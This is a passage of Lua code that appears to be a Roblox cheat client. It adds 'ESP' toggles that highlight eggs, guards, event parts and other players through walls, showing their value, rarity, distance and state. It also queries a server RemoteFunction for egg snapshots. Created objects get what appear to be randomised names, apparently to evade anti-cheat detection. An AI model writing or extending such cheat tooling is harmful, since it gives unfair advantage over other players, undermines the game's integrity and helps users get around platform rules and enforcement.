				frame.Parent = v15
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = fn3()
				imageLabel.AnchorPoint = Vector2.new(0.5, 1)
				imageLabel.BackgroundTransparency = 1
				imageLabel.Position = UDim2.fromScale(0.5, 1)
				imageLabel.Size = UDim2.fromScale(1, 1)
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.Parent = frame
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = fn3()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height
				uiAspectRatioConstraint.Parent = imageLabel

				local tbl21 = {
					Billboard = v14,
					IconHolder = frame,
					Icon = imageLabel,
					NameRow = tbl6.CreateTextRow(v15, tbl6.MainFont, 1, 0.4),
					RarityRow = tbl6.CreateTextRow(v15, v8, 2, 0.2),
					MutationRow = tbl6.CreateTextRow(v15, tbl6.MainFont, 3, 0.2),
					ValueRow = tbl6.CreateTextRow(v15, tbl6.MainFont, 4, 0.2),
					ExtraRow = tbl6.CreateTextRow(v15, tbl6.MainFont, 5, 0.2),
					Highlight = nil,
					Anchor = nil,
					CFrame = nil,
					Width = nil,
					Height = nil,
					ShowIcon = false,
					ShowName = true,
					ShowRarity = false,
					ShowMutation = false,
					ShowValue = false,
					ShowExtra = false,
				}

				fn18(tbl21)
				return tbl21
			end

			local function fn20(arg)
				if arg.Highlight then
					arg.Highlight:Destroy()
					arg.Highlight = nil
					n18 -= 1
				end
			end

			local function fn21(arg, arg2)
				local n19 = tonumber(arg.AssetScale) or 1
				local n20 = n19 > 5 and (n19 / 5) ^ 1.2 * 19.637875755794113 or n19 ^ 1.85
				local mutations = tbl.Mutations
				local flag3 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n21 = 1

				if flag3 then
					local ok
					ok, n21 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n21) == "number"
					local n22 = 1

					if not ok then
						n21 = n22
					end
				end

				return arg2.EarningRate * n20 * n21
			end

			local function fn22()
				local tbl21 = {}
				local eggState = tbl.EggState
				local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
				if not placedEggRenders or type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl21
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl21
				end
				local str = tostring(localPlayer.UserId)
				local tbl22 = {}

				for _, child in ipairs(placedEggRenders:GetChildren()) do
					if string.find(child.Name, str, 1, true) then
						tbl22[#tbl22 + 1] = child
					end
				end

				for k, v14 in pairs(result) do
					if type(v14) == "table" and v14.Placement ~= nil and type(v14.AssetCategory) == "string" then
						local base = tostring(k)
						local v15 = nil

						for _, v16 in ipairs(tbl22) do
							if v16.Name == base or string.find(v16.Name, base, 1, true) or v16:GetAttribute("Uid") == base then
								v15 = v16
								break
							end
						end

						if v15 then
							local ok2, result2 = pcall(function()
								return v15:IsA("Model") and v15:GetPivot() or v15.CFrame
							end)

							local mutations = type(v14.Mutations) == "table" and v14.Mutations or {}

							tbl21[#tbl21 + 1] = {
								Uid = "base:" .. base,
								AssetCategory = v14.AssetCategory,
								AssetScale = v14.AssetScale,
								Mutations = mutations,
								BaseMutation = v14.BaseMutation or mutations[1],
								State = "Base",
								AreaId = "Your Base",
								BottomCFrame = ok2 and result2 or nil,
								Model = v15,
							}
						end
					end
				end

				return tbl21
			end

			local function fn23(arg, arg2)
				if arg.State == "Claimed" then
					return false
				end

				if tbl16.MinRarity > 0 and arg2.Number < tbl16.MinRarity then
					return false
				end

				if tbl16.MinValue > 0 and fn21(arg, arg2) < tbl16.MinValue then
					return false
				end
				return true
			end

			local function fn24(arg, arg2, arg3)
				local model, hitbox

				if typeof(arg2.Model) == "Instance" then
					model = arg2.Model
					hitbox = model:FindFirstChild("Hitbox", true) or model:FindFirstChildWhichIsA("BasePart", true)
					hitbox = hitbox and hitbox:IsA("BasePart") and hitbox or nil
				else
					model, hitbox = fn14(arg2.Uid)
				end

				local bottomCFrame = arg2.BottomCFrame

				if typeof(bottomCFrame) == "CFrame" then
					local terrain = hitbox or workspace.Terrain

					if arg.Anchor ~= terrain or arg.CFrame ~= bottomCFrame then
						arg.Anchor = terrain
						arg.CFrame = bottomCFrame
						arg.Billboard.Adornee = terrain
						arg.Billboard.StudsOffsetWorldSpace = bottomCFrame.Position - terrain.Position + Vector3.new(0, (hitbox and hitbox.Position.Y - bottomCFrame.Position.Y or 1) + n11, 0)
					end
				end

				local info = tbl16.Info
				local baseMutation = arg2.BaseMutation
				local showMutation = type(baseMutation) == "string" and baseMutation ~= ""
				local n19 = tonumber(arg2.AssetScale) or 1
				local showIcon = info.Icon == true and arg3.Icon ~= nil

				if showIcon and arg.Icon.Image ~= tostring(arg3.Icon) then
					arg.Icon.Image = tostring(arg3.Icon)
				end

				local showName = info.Name == true

				if showName then
					tbl6.SetRow(arg.NameRow, arg3.DisplayName, tbl14)
				end

				local showRarity = info.Rarity == true and arg3.Name ~= ""

				if showRarity then
					local rarityPalette = arg3.RarityPalette
					tbl6.SetRow(arg.RarityRow, string.upper(arg3.Name), rarityPalette)
				end

				showMutation = info.Mutation == true and showMutation

				if showMutation then
					tbl6.SetRow(arg.MutationRow, string.upper(fn7(baseMutation)), tbl15[baseMutation] or v11)
				end

				local showValue = info.Value == true

				if showValue then
					tbl6.SetRow(arg.ValueRow, "$" .. fn16(fn21(arg2, arg3)) .. "/s", v10)
				end

				local tbl21 = {}
				local eggRecords = tbl.EggRecords

				if info.Weight and type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
					local ok, result = pcall(eggRecords.WeightKgForScale, arg2.AssetCategory, n19)

					if ok and tonumber(result) then
						table.insert(tbl21, fn16(result) .. " kg")
					end
				end

				if info.Size then
					table.insert(tbl21, string.format("x%.2f", n19))
				end

				if info["Sell Price"] and type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
					local ok, result = pcall(eggRecords.SellPrice, arg2)

					if ok and tonumber(result) then
						table.insert(tbl21, "$" .. fn16(result))
					end
				end

				if info.Distance and typeof(bottomCFrame) == "CFrame" then
					local character = localPlayer.Character
					character = character and character:FindFirstChild("HumanoidRootPart")

					if character then
						table.insert(tbl21, string.format("%dm", math.floor((character.Position - bottomCFrame.Position).Magnitude + 0.5)))
					end
				end

				if info.Area and arg2.AreaId ~= nil then
					table.insert(tbl21, tostring(arg2.AreaId))
				end

				if info.State and arg2.State ~= nil and arg2.State ~= "Slot" then
					table.insert(tbl21, tostring(arg2.State))
				end

				local showExtra = #tbl21 > 0

				if showExtra then
					tbl6.SetRow(arg.ExtraRow, table.concat(tbl21, "  |  "), tbl6.Palettes.Sheen)
				end

				if arg.ShowIcon ~= showIcon or arg.ShowName ~= showName or arg.ShowRarity ~= showRarity or arg.ShowMutation ~= showMutation or arg.ShowValue ~= showValue or arg.ShowExtra ~= showExtra then
					arg.ShowIcon = showIcon
					arg.ShowName = showName
					arg.ShowRarity = showRarity
					arg.ShowMutation = showMutation
					arg.ShowValue = showValue
					arg.ShowExtra = showExtra
					fn18(arg)
				end

				if (tbl16.Highlight == tbl12[3] or tbl16.Highlight == tbl12[2] and arg3.Number >= tbl16.HighlightMin) and model then
					if not arg.Highlight and n18 < n10 then
						local highlight = Instance.new("Highlight")
						highlight.Name = fn3()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.82
						highlight.OutlineTransparency = 0.05
						highlight.FillColor = arg3.Color
						highlight.OutlineColor = arg3.Palette.Outline
						highlight.Parent = v13
						arg.Highlight = highlight
						n18 += 1
					end

					if arg.Highlight and arg.Highlight.Adornee ~= model then
						arg.Highlight.Adornee = model
					end
				else
					fn20(arg)
				end
			end

			local function fn25(arg)
				fn20(arg)
				arg.Billboard:Destroy()
			end

			local function fn26()
				local v14 = tbl17
				local v15 = v13
				tbl17 = {}
				v13 = nil
				n18 = 0

				task.spawn(function()
					local now = os.clock()

					for _, v16 in pairs(v14) do
						if v16.Highlight then
							v16.Highlight:Destroy()
						end

						v16.Billboard:Destroy()

						if os.clock() - now > n14 then
							RunService.Heartbeat:Wait()
							now = os.clock()
						end
					end

					if v15 then
						v15:Destroy()
					end
				end)
			end

			local function fn27(arg, arg2, arg3)
				local function fn28()
					return arg2 == n17 and arg3 == n16 and flag
				end

				fn15()
				local tbl21 = {}
				local now = os.clock()

				for _, v14 in pairs(arg) do
					local uid = type(v14) == "table" and v14.Uid

					if type(uid) == "string" and type(v14.AssetCategory) == "string" then
						local v15 = fn10(v14.AssetCategory)

						if tbl16.Eggs and fn23(v14, v15) then
							tbl21[uid] = true
							local v16 = tbl17[uid]

							if not v16 then
								v16 = fn19()
								tbl17[uid] = v16
							end

							fn24(v16, v14, v15)
						end
					end

					if not (n14 < os.clock() - now) then
						continue
					end
					RunService.Heartbeat:Wait()
					now = os.clock()
					if not fn28() then
						return
					end
				end

				if tbl16.Eggs and tbl16.OwnBase then
					for _, v14 in ipairs(fn22()) do
						local v15 = fn10(v14.AssetCategory)

						if fn23(v14, v15) then
							tbl21[v14.Uid] = true
							local v16 = tbl17[v14.Uid]

							if not v16 then
								v16 = fn19()
								tbl17[v14.Uid] = v16
							end

							fn24(v16, v14, v15)
						end
					end
				end

				for k, v14 in pairs(tbl17) do
					if not tbl21[k] then
						tbl17[k] = nil
						fn25(v14)
					end
				end

				return true
			end

			local flag3 = false
			local flag4 = false

			fn12 = function()
				if not flag or not v12 then
					return
				end
				flag3 = true
				if flag4 then
					return
				end
				flag4 = true

				task.defer(function()
					while flag and v12 and flag3 do
						flag3 = false
						n17 += 1
						local ok, result = pcall(fn27, v12, n17, n16)

						if ok and result ~= true then
							flag3 = true
						end

						RunService.Heartbeat:Wait()
					end

					flag4 = false
				end)
			end

			local function fn28()
				local v14 = n16

				if v12 and next(tbl17) == nil then
					fn12()
				end

				local eggState = tbl.EggState
				local flag5 = type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function"
				local records = nil

				if flag5 then
					local ok, result = pcall(eggState.ReadFieldEggs)
					ok = ok and type(result) == "table" and type(result.Records) == "table"
					local v15 = nil

					if ok then
						records = result.Records
					else
						records = v15
					end
				end

				if records == nil and rfEggWorldAskFieldEggSnapshot and os.clock() >= n15 then
					n15 = os.clock() + 30
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

					if ok and type(result) == "table" and type(result.Records) == "table" then
						records = result.Records
					end
				end

				if v14 ~= n16 or not flag then
					return
				end

				if records ~= nil then
					local tbl21 = {}

					for k, record in pairs(records) do
						tbl21[k] = record
					end

					v12 = tbl21
				end

				if v12 then
					fn12()
				end
			end

			local function fn29()
				task.spawn(pcall, fn28)
			end

			local function fn30()
				if flag2 then
					return
				end
				flag2 = true

				task.delay(0.5, function()
					flag2 = false

					if flag then
						fn29()
					end
				end)
			end

			fn13 = function()
				for _, v14 in pairs(tbl17) do
					fn11(v14)
				end
			end

			local function fn31()
				flag = false
				n16 += 1
				n17 += 1
				tbl6.DisconnectAll(tbl18)
				fn26()
			end

			local function fn32()
				if flag then
					fn29()
					return
				end
				flag = true
				local v14 = n16
				local eggState = tbl.EggState

				if type(eggState) == "table" then
					for _, v15 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
						local v16 = eggState[v15]

						if type(v16) == "table" and type(v16.Connect) == "function" then
							local ok, result = pcall(v16.Connect, v16, fn30)

							if ok and result then
								table.insert(tbl18, result)
							end
						end
					end
				end

				for _, v15 in ipairs({ "AreaEggSlotsClient", "PlacedEggRenders" }) do
					local v16 = workspace:FindFirstChild(v15)

					if v16 then
						table.insert(tbl18, v16.ChildAdded:Connect(fn30))
						table.insert(tbl18, v16.ChildRemoved:Connect(fn30))
					end
				end

				task.spawn(function()
					while v14 == n16 do
						task.wait(10)
						if v14 == n16 then
							fn30()
							continue
						end
						break
					end
				end)

				task.spawn(function()
					while v14 == n16 do
						task.wait(1)

						if v14 == n16 then
							if tbl16.Info.Distance then
								fn12()
							end

							continue
						end

						break
					end
				end)

				fn29()
			end

			local function fn33()
				if tbl16.Eggs then
					fn32()
				else
					fn31()
				end
			end

			tbl19 = { Eggs = nil }
			local tbl21 = { Eggs = false }
			local flag5 = false

			local function fn34()
				if flag5 then
					return
				end
				local v14 = tbl6.ReadToggle(tbl19.Eggs, tbl21.Eggs)
				if v14 == tbl16.Eggs and flag == v14 then
					return
				end
				tbl16.Eggs = v14
				fn33()
			end

			fn4(function()
				flag5 = true
				tbl16.Eggs = false
				fn31()
			end)

			local function fn35(arg)
				local tbl22 = {}

				if type(arg) == "table" then
					for k, v14 in pairs(arg) do
						k = v14 == true and type(k) == "string" and k
						local flag6

						if k then
							flag6 = k
						else
							flag6 = type(v14) == "string" and v14
						end

						local v15 = flag6 or nil

						if v15 then
							tbl22[v15] = true
						end
					end
				end

				return tbl22
			end

			tbl19.Eggs = espSection:CreateToggle({
				Name = "ESP Eggs",
				Default = false,
				Callback = function(arg)
					tbl21.Eggs = arg == true
					tbl6.SyncSoon(fn34)
				end,
			})

			espSection:CreateToggle({
				Name = "ESP Fixed Size",
				Default = false,
				SubOf = tbl19.Eggs,
				Callback = function(arg)
					local fixedSize = arg == true

					if tbl16.FixedSize ~= fixedSize then
						tbl16.FixedSize = fixedSize
						fn13()
					end
				end,
			})

			espSection:CreateToggle({
				Name = "ESP Own Base Eggs",
				Note = "Also show the eggs placed in your own base",
				Default = true,
				SubOf = tbl19.Eggs,
				Callback = function(arg)
					tbl16.OwnBase = arg ~= false
					fn12()
				end,
			})

			local tbl22 = { "Any" }
			local tbl23 = { Any = 0 }
			local tbl24 = {}
			local tbl25 = {}
			local tbl26 = { "Any Mutation", "No Mutation" }
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl27 = {}
			local tbl28 = {}

			if type(directory) == "table" then
				for k, v14 in pairs(directory) do
					local rarity = type(v14) == "table" and v14.Rarity or nil
					local rarity2 = type(rarity) == "table"

					if rarity2 then
						rarity2 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					rarity2 = rarity2 or nil

					if rarity2 then
						local rarityName = tostring(rarity.DisplayName or rarity._id or rarity2)
						tbl27[rarity2] = tbl27[rarity2] or rarityName
						local insert = table.insert
						local tbl29 = { Category = tostring(k) }
						local v15 = tostring
						k = v14.DisplayName or k
						tbl29.Name = v15(k)
						tbl29.Rarity = rarity2
						tbl29.RarityName = rarityName
						insert(tbl28, tbl29)
					end
				end
			end

			local tbl29 = {}

			for k in pairs(tbl27) do
				table.insert(tbl29, k)
			end

			table.sort(tbl29)

			for _, v14 in ipairs(tbl29) do
				local str = string.format("%d - %s", v14, tbl27[v14])
				table.insert(tbl22, str)
				tbl23[str] = v14
			end

			table.sort(tbl28, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v14 in ipairs(tbl28) do
				local str = string.format("%s [%s]", v14.Name, v14.RarityName)

				if tbl25[str] then
					str = string.format("%s [%s] (%s)", v14.Name, v14.RarityName, v14.Category)
				end

				table.insert(tbl24, str)
				tbl25[str] = v14.Category
			end

			local tbl30 = {}
			local mutations = tbl.Mutations

			if type(mutations) == "table" and type(mutations.IdSet) == "table" then
				for k in pairs(mutations.IdSet) do
					table.insert(tbl30, tostring(k))
				end
			end

			table.sort(tbl30)

			for _, v14 in ipairs(tbl30) do
				table.insert(tbl26, v14)
			end

			local function fn36(arg)
				for _, v14 in ipairs(tbl22) do
					if tbl23[v14] == arg then
						return v14
					end
				end

				return tbl22[1]
			end

			espSection:CreateDropdown({
				Name = "ESP Min Rarity",
				Note = "Show eggs of the chosen rarity and every rarity above it",
				Options = tbl22,
				Default = fn36(5),
				SubOf = tbl19.Eggs,
				Callback = function(arg)
					tbl16.MinRarity = tbl23[type(arg) == "table" and arg[1] or arg] or 0
					fn12()
				end,
			})

			fn6(espSection:CreateMultiDropdown({
				Name = "ESP Show Info",
				Options = tbl10,
				Default = tbl11,
				SubOf = tbl19.Eggs,
				Callback = function(arg)
					tbl16.Info = fn35(arg)
					fn12()
				end,
			}))
		end

		do
			local tbl20 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local n18 = 0
			local str = "M/s"

			local function fn14(arg, arg2)
				if arg ~= nil then
					n18 = math.max(0, math.floor(tonumber(arg) or n18))
				end

				if arg2 ~= nil then
					str = tostring(arg2)
				end

				tbl16.MinValue = n18 * (tbl20[str] or tbl20["M/s"]).Mult
				fn12()
			end

			fn5(espSection, {
				Name = "Min ESP Value",
				SubOf = tbl19.Eggs,
				Legacy = "ESP Min Value",
				SectionName = "ESP",
				OnRaw = function(arg)
					fn14(math.floor(arg / 1000), "K/s")
				end,
			})
		end

		espSection:CreateSlider({
			Name = "ESP Egg Size",
			Min = 50,
			Max = 200,
			Default = 75,
			Increment = 5,
			Unit = "%",
			SubOf = tbl19.Eggs,
			Callback = function(arg)
				local num = tonumber(arg)

				if num and tbl16.SizeScale ~= num / 100 then
					tbl16.SizeScale = num / 100
					fn13()
				end
			end,
		})

		do
			local n18 = 1
			local n19 = 0.75

			local tbl20 = {
				Sleeping = tbl6.Palettes.Accent,
				Waking = tbl6.Palettes.Gold,
				Chasing = tbl6.Palettes.Red,
			}

			local orange = tbl6.Palettes.Orange
			local tbl21 = {}
			local tbl22 = {}
			local flag3 = false
			local v14 = nil

			local function fn14(arg)
				local attribute = arg:GetAttribute("GuardState")
				if attribute == "Sleeping" then
					return "Sleeping"
				end

				if attribute == "Waking" then
					return "Waking Up"
				end

				if attribute == "Chasing" then
					local attribute2 = arg:GetAttribute("TargetPlayer")
					if attribute2 == tostring(localPlayer.UserId) then
						return "Chasing You"
					end
					local playerByUserId = tonumber(attribute2) and Players:GetPlayerByUserId(tonumber(attribute2))
					return playerByUserId and "Chasing " .. playerByUserId.DisplayName or "Chasing"
				end

				return attribute and tostring(attribute) or "Awake"
			end

			local function fn15(arg, arg2)
				local v15 = tbl20[arg2:GetAttribute("GuardState")] or orange
				arg.Highlight.FillColor = v15.Outline
				arg.Highlight.OutlineColor = v15.Outline
				tbl6.SetRow(arg.StateRow, fn14(arg2), v15)
			end

			local function fn16(arg)
				local floor = math.floor
				arg.Tag.Size = UDim2.fromOffset(tbl6.ScaledWidth(115, n19), floor(tbl6.RowHeight(n19) * 1.6))
			end

			local function fn17(arg)
				local v15 = tbl21[arg]
				if not v15 then
					return
				end
				tbl21[arg] = nil
				tbl6.DisconnectAll(v15.Connections)
				v15.Highlight:Destroy()
				v15.Tag:Destroy()
			end

			local function fn18(arg, adornee)
				if tbl21[adornee] then
					return
				end
				local v15 = tbl6.FindGuardRoot(adornee)
				if not v15 then
					return
				end

				if not v14 or not v14.Parent then
					v14 = tbl6.CreateRuntime()
				end

				local highlight = Instance.new("Highlight")
				highlight.Name = fn3()
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillTransparency = 0.76
				highlight.OutlineTransparency = 0.02
				highlight.Adornee = adornee
				highlight.Parent = v14
				local ok, result, result2 = pcall(adornee.GetBoundingBox, adornee)
				ok = ok and typeof(result) == "CFrame"
				local n20 = 6

				if ok then
					n20 = result.Position.Y + result2.Y * 0.5 - v15.Position.Y + n18
				end

				local v16, v17 = tbl6.CreateTag(v14, math.huge)
				v16.Adornee = v15
				v16.StudsOffsetWorldSpace = Vector3.new(0, n20, 0)
				local v18 = tbl6.CreateTextRow(v17, tbl6.StatusFont, 1, 0.45)
				local v19 = tbl6.CreateTextRow(v17, tbl6.StatusFont, 2, 0.55)
				local sheen2 = tbl6.Palettes.Sheen
				tbl6.SetRow(v18, tostring(arg) .. " Guard", sheen2)
				local tbl23 = { Highlight = highlight, Tag = v16, StateRow = v19, Connections = {} }
				tbl21[adornee] = tbl23
				fn16(tbl23)
				fn15(tbl23, adornee)

				local function fn19()
					fn15(tbl23, adornee)
				end

				table.insert(tbl23.Connections, adornee:GetAttributeChangedSignal("GuardState"):Connect(fn19))
				table.insert(tbl23.Connections, adornee:GetAttributeChangedSignal("TargetPlayer"):Connect(fn19))

				table.insert(tbl23.Connections, adornee.AncestryChanged:Connect(function()
					if not adornee:IsDescendantOf(workspace) then
						fn17(adornee)
					end
				end))
			end

			local function fn19()
				flag3 = false
				tbl6.DisconnectAll(tbl22)

				for k in pairs(tbl21) do
					fn17(k)
				end

				if v14 then
					v14:Destroy()
					v14 = nil
				end
			end

			local function fn20()
				if flag3 then
					return
				end
				flag3 = true
				tbl22 = tbl6.WatchGuards(fn18)
			end

			local v15 = nil
			local flag4 = false
			local flag5 = false

			local function fn21()
				if flag5 then
					return
				end

				if tbl6.ReadToggle(v15, flag4) then
					fn20()
				elseif flag3 then
					fn19()
				end
			end

			fn4(function()
				flag5 = true
				fn19()
			end)

			v15 = espSection:CreateToggle({
				Name = "ESP Guards",
				Default = false,
				Callback = function(arg)
					flag4 = arg == true
					tbl6.SyncSoon(fn21)
				end,
			})

			espSection:CreateSlider({
				Name = "ESP Guard Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = v15,
				Callback = function(arg)
					local num = tonumber(arg)

					if num and n19 ~= num / 100 then
						n19 = num / 100

						for _, v16 in pairs(tbl21) do
							fn16(v16)
						end
					end
				end,
			})
		end

		do
			local tbl20 = {
				{ Id = "LostPart1", Label = "Mechanical Gear" },
				{ Id = "LostPart2", Label = "Wiring Harness" },
			}

			local v14 = tbl6.PaletteFromColor(Color3.fromRGB(255, 216, 61))
			local accent = tbl6.Palettes.Accent
			local v15 = nil
			local tbl21 = {}
			local flag3 = false
			local connection = nil
			local v16 = nil
			local flag4 = false
			local flag5 = false

			local function fn14(arg)
				local v17 = tbl21[arg]
				if not v17 then
					return
				end
				tbl21[arg] = nil

				pcall(function()
					v17.Highlight:Destroy()
					v17.Tag:Destroy()
				end)
			end

			local function fn15()
				local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")

				for _, v17 in ipairs(tbl20) do
					local v18 = drScrambleEvent and drScrambleEvent:FindFirstChild(v17.Id)
					local hitbox = v18 and (v18:FindFirstChild("Hitbox", true) or v18.PrimaryPart or v18:FindFirstChildWhichIsA("BasePart", true))
					local tbl22 = tbl21[v17.Id]

					if tbl22 and (tbl22.Model ~= v18 or not hitbox) then
						fn14(v17.Id)
						tbl22 = nil
					end

					if hitbox and not tbl22 then
						if not v15 or not v15.Parent then
							v15 = tbl6.CreateRuntime()
						end

						local highlight = Instance.new("Highlight")
						highlight.Name = fn3()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.7
						highlight.OutlineTransparency = 0.02
						highlight.Adornee = v18
						highlight.Parent = v15
						local v19, v20 = tbl6.CreateTag(v15, 25000)
						v19.Adornee = hitbox
						v19.StudsOffsetWorldSpace = Vector3.new(0, 4, 0)
						local floor = math.floor
						v19.Size = UDim2.fromOffset(tbl6.ScaledWidth(160), floor(tbl6.RowHeight() * 1.6))
						local v21 = tbl6.CreateTextRow(v20, tbl6.StatusFont, 1, 0.5)
						local v22 = tbl6.CreateTextRow(v20, tbl6.StatusFont, 2, 0.5)
						tbl6.SetRow(v21, v17.Label, tbl6.Palettes.Sheen)
						tbl22 = { Model = v18, Hitbox = hitbox, Highlight = highlight, Tag = v19, InfoRow = v22 }
						tbl21[v17.Id] = tbl22
					end

					if tbl22 then
						local flag6 = type(tbl4.ScrambleLostPart) == "function" and tbl4.ScrambleLostPart(v17.Id) == true
						local v19 = flag6 and accent or v14
						tbl6.SetRow(tbl22.InfoRow, flag6 and "Collected" or string.format("%d studs", math.floor(tbl4.DistanceTo(tbl22.Hitbox.Position))), v19)
						tbl22.Highlight.FillColor = v19.Outline
						tbl22.Highlight.OutlineColor = v19.Outline
					end
				end
			end

			local function fn16()
				flag3 = false

				if connection then
					connection:Disconnect()
					connection = nil
				end

				for k in pairs(tbl21) do
					fn14(k)
				end

				if v15 then
					v15:Destroy()
					v15 = nil
				end
			end

			local function fn17()
				if flag3 then
					return
				end
				flag3 = true
				local n18 = 1

				connection = RunService.Heartbeat:Connect(function(deltaTime)
					n18 += deltaTime

					if n18 >= 0.3 then
						n18 = 0
						pcall(fn15)
					end
				end)
			end

			local function fn18()
				if flag5 then
					return
				end

				if tbl6.ReadToggle(v16, flag4) then
					fn17()
				elseif flag3 then
					fn16()
				end
			end

			fn4(function()
				flag5 = true
				fn16()
			end)

			v16 = espSection:CreateToggle({
				Name = "ESP Lost Parts",
				Default = false,
				Callback = function(arg)
					flag4 = arg == true
					tbl6.SyncSoon(fn18)
				end,
			})
		end

		local font, v14, flag3, n18, v15, tbl20, tbl21, tbl22, n19, tbl23
		local v16, flag4, flag5

		do
			local TextService = game:GetService("TextService")
			font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
			local colorSequence = ColorSequence.new
			local tbl24 = {}
			local v17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 255, 205))
			local v18 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 225, 255))
			tbl24[1] = v17
			tbl24[2] = v18

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(210, 135, 255)))
				table.move(values, 1, values.n, 3, tbl24)
			end

			v14 = colorSequence(tbl24)

			local colorSequence2 = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 73, 66)),
				ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 17, 79)),
			})

			flag3 = false
			n18 = 0
			v15 = nil
			tbl20 = {}
			tbl21 = {}
			tbl22 = {}
			local tbl25 = {}
			n19 = 0.75
			tbl23 = { Name = true, Username = false, Avatar = false, Tool = true }
			v16 = nil
			flag4 = false
			flag5 = false

			local function fn14(arg)
				local str = tostring(arg or "")
				if str:match("^%d+$") then
					return "rbxassetid://" .. str
				end
				return str
			end

			local function fn15(arg)
				if not arg or not arg:IsA("Tool") then
					return ""
				end
				local v19 = fn14(arg.TextureId)
				if v19 ~= "" then
					return v19
				end

				for _, v20 in ipairs({ "Icon", "Image", "Thumbnail", "TextureId" }) do
					local attribute = arg:GetAttribute(v20)
					if type(attribute) == "string" and fn14(attribute) ~= "" then
						return fn14(attribute)
					end
				end

				for _, descendant in ipairs(arg:GetDescendants()) do
					if descendant:IsA("Decal") or descendant:IsA("Texture") then
						v19 = fn14(descendant.Texture)
					elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
						v19 = fn14(descendant.Image)
					end

					if v19 ~= "" then
						return v19
					end
				end

				return ""
			end

			local function fn16()
				local currentCamera = workspace.CurrentCamera
				return math.max(1, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.024, 26, 35) * n19))
			end

			local function fn17(text, size)
				local str = text .. "@" .. size
				local v19 = tbl25[str]
				if v19 then
					return v19
				end
				local getTextBoundsParams = Instance.new("GetTextBoundsParams")
				getTextBoundsParams.Text = text
				getTextBoundsParams.Font = font
				getTextBoundsParams.Size = size
				getTextBoundsParams.Width = 1000

				local ok, result = pcall(function()
					return TextService:GetTextBoundsAsync(getTextBoundsParams)
				end)

				getTextBoundsParams:Destroy()
				ok = ok and result.X

				if not ok then
					ok = (utf8.len(text) or #text) * size * 0.56
				end

				tbl25[str] = ok
				return ok
			end

			local function fn18(arg, color3, arg2, arg3)
				arg.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
				arg.Color = color3
				arg.LineJoinMode = Enum.LineJoinMode.Round
				arg.Transparency = 0

				arg.Thickness = pcall(function()
					arg.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
				end) and arg2 or arg3
			end

			local function createTextLabel(parent, zIndex)
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = fn3()
				textLabel.AnchorPoint = Vector2.new(0, 0.5)
				textLabel.BackgroundTransparency = 1
				textLabel.FontFace = font
				textLabel.Text = ""
				textLabel.TextScaled = true
				textLabel.TextStrokeTransparency = 1
				textLabel.TextXAlignment = Enum.TextXAlignment.Center
				textLabel.TextYAlignment = Enum.TextYAlignment.Center
				textLabel.ZIndex = zIndex
				textLabel.Parent = parent
				return textLabel
			end

			local function createImageLabel(parent, zIndex)
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = fn3()
				imageLabel.AnchorPoint = Vector2.new(0, 0.5)
				imageLabel.BackgroundTransparency = 1
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.ZIndex = zIndex
				imageLabel.Parent = parent
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = fn3()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.Parent = imageLabel
				return imageLabel
			end

			local function fn19(arg)
				local v19 = fn16()
				local visible = tbl23.Name == true or tbl23.Username == true
				local visible2 = tbl23.Avatar == true
				local visible3 = tbl23.Tool == true and arg.ToolIcon.Image ~= ""
				local n20 = visible2 and math.floor(v19 * 0.72) or 0
				local n21 = visible3 and math.floor(v19 * 0.82) or 0
				local n22 = math.floor(v19 * 0.7)
				local n23 = math.max(1, math.floor(v19 * 0.04))
				local name = tbl23.Username == true and arg.Player.Name or arg.Player.DisplayName
				arg.Name.Text = name
				arg.Shadow.Text = name
